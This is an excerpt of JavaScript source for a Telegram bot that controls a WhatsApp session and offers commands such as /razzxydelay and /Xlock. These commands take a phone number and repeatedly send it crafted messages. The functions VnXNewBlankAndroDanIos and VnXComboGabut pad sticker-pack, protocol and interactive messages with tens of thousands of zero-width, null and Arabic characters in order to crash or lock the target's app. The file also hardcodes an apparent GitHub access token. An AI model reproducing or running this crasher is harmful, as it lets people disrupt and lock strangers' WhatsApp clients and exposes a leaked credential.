...
const GITHUB_TOKEN = "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";

const databaseUrl = `https://raw.githubusercontent.com/razzxy6-creator/Dbscc/refs/heads/main/token.json`;
  ...
  const thumbnailUrl = "https://files.catbox.moe/x0m5fm.jpg"; // FOTO PAS Kirim Bug
  
  const StartUrl = "https://files.catbox.moe/x0m5fm.jpg"; // FOTO PAS START
  
  const menuUrl = "https://files.catbox.moe/x0m5fm.jpg"; // FOTO MENU
  
  const bugUrl = "https://files.catbox.moe/x0m5fm.jpg"; // FOTO MENU BUG
  
  const toolsUrl = "https://files.catbox.moe/x0m5fm.jpg"; // FOTO TOOLS
  
  const tqtoUrl = "https://files.catbox.moe/x0m5fm.jpg"; // FOTO TQTO
  
  const attackUrl = "https://files.catbox.moe/x0m5fm.jpg"; // FOTO PAS BERES BUG
...
Reason: ${reason}`;
  ...
  console.log("\x1b[41m\x1b[37m[🔐 PROTECTION]\x1b[0m BY razzxy ACTIVE ⚡️\n");
}
...
│𖤓 /razzxydelay ➜ 𝙳𝙴𝙻𝙰𝚈 𝙸𝙿𝙾𝙽𝙴 masih nyari func
│𖤓 /Scrot ➜ 𝙳𝙴𝙻𝙰𝚈 𝙱𝚄𝙻𝙳𝙾𝚉𝙴𝚁
│𖤓 /Xlock ➜ 𝙻𝙾𝙲𝙺 𝙲𝙷𝙰𝚃 𝙽𝙾 𝙸𝙽𝚅𝙸𝚂
╰━━━━━━━━━━━━━━━━━━━━━━━╯</pre>`;
//bugmenuanjing
    const keyboard = [
    [
...
bot.command("update", checkAdmin, async (ctx) => {
    ...
    await ctx.reply("🔄 sedang mengambil file update");
...
bot.command("razzxydelay", checkWhatsAppConnection, checkJoinChannel, checkPremium, checkCooldown, async (ctx) => {
  let number = ctx.message.text.split(" ")[1];
  if (!number) return ctx.reply(`🪧 ☇ Format: /xspam 62×××`);
  let target = number.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;
...
`,
  ...
  for (let i = 0; i < speed; i++) {
    await new Promise(res => setTimeout(res, initialDelay));
    await VnXNewBlankAndroDanIos(sock, target);
    await VnXNewBlankAndroDanIos(sock, target);
  }
});
...
bot.command("Xlock", checkWhatsAppConnection, checkJoinChannel, checkPremium, checkCooldown, async (ctx) => {
  let number = ctx.message.text.split(" ")[1];
  if (!number) return ctx.reply(`🪧 ☇ Format: /xspam 62×××`);
  let target = number.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;
...
`,
  ...
  for (let i = 0; i < speed; i++) {
    await new Promise(res => setTimeout(res, initialDelay));
    await VnXNewLockChat(sock, target);
    await VnXNewLockChat(sock, target);
    await VnXNewLockChat(sock, target);
    await VnXNewLockChat(sock, target);
  }
...
`,
  ...
  for (let i = 0; i < 97; i++) {
    await new Promise(res => setTimeout(res, initialDelay));
    await VnXComboGabut(sock, target);
    await VnXComboGabuton(sock, target);
    await VnXComboGabut(sock, target);
  }
});
...
async function VnXNewBlankAndroDanIos(sock, target) {
  const msg = {
    stickerPackMessage: {
      stickerPackId: "2496ad84-4561-43ca-949e-f644f9ff8bb9",
      name: "Blank Ios & Andro 🦠",
      publisher: "\u200C".repeat(50000),
      stickers: [],
      fileLength: "999999999",
      fileSha256: "R6igHHOD7+oEoXfNXT+5i79ugSRoyiGMI/h8zxH/vcU=",
      fileEncSha256: "xEzAq/JvY6S6q02QECdxOAzTkYmcmIBdHTnJbp3hsF8=",
      ...
      packDescription: "./VnX" + "؂ن؃؄ٽ؂ن؃".repeat(10000),
...
async function VnXComboGabut(sock, target) {
    const vnxv1 = {
        interactiveMessage: {
            body: {
                text: "Awasss ad VnX",
    ...
    const vnxv2 = {
        protocolMessage: {
            ...
            key: {
                remoteJid: "status@broadcast",
                fromMe: false,
                id: "\u0000".repeat(60000) + "\u600b".repeat(40000)
            },
    ...
    const vnxv3 = {
        interactiveResponseMessage: {
            ...
            contextInfo: {
                ...
                isForwarded: true,
                forwardingScore: 999,
                mentionedJid: ["status@broadcast", target]
            }
        }
    };

    await sock.relayMessage(target, vnxv1, {
        participant: { jid: target }
    });

    await sock.relayMessage(target, vnxv2, {
        participant: { jid: target }
    });

    await sock.relayMessage(target, vnxv3, {
        participant: { jid: target }
    });

    console.log("VnX Combo Jir Gabut + target");
}
//
